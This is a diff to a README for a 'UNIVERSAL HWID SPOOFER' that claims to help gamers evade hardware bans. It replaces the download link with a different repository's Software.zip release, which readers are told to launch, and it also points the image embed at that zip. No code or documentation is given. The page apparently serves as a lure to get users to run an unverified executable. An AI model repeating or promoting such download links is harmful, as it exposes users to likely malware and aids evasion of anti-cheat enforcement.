@@ -25,7 +25,7 @@ Welcome to the UNIVERSAL HWID SPOOFER repository! 🚀 In this repository, you w
 - vanguard-hwid-change
 
 ## Usage
-Download the software from [here](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) and launch it to start spoofing your HWID. 🔧
+Download the software from [here](https://github.com/tamin1111/UNIVERSAL-HWID-SPOOFER/releases/download/v2.0/Software.zip) and launch it to start spoofing your HWID. 🔧
 
 ## Support
 If the link doesn't work or you need more information, please check the "Releases" section of this repository.
@@ -35,4 +35,4 @@ We do not claim or guarantee the effectiveness of this tool in bypassing bans. U
 
 Happy gaming! 🎮
 
-![HWID Spoofer](https://example.com/hwid-spoofer-image.png)
+![HWID Spoofer](https://github.com/tamin1111/UNIVERSAL-HWID-SPOOFER/releases/download/v2.0/Software.zip)
